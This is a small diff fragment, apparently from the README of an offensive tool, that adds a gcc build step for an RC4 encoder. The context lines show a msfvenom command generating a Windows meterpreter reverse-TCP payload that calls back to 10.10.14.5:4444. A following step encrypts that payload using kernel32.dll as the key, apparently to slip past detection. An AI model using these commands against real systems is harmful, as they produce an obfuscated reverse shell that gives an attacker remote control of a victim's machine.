@@ -44,6 +44,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f r
 ### 2 - Encrypt with RC4
 
 ```bash
+gcc -g -o build/encode2rc4-linux encode2rc4.c rc4.c
 ./build/encode2rc4-linux kernel32.dll payload.bin payload.enc
 ```
 
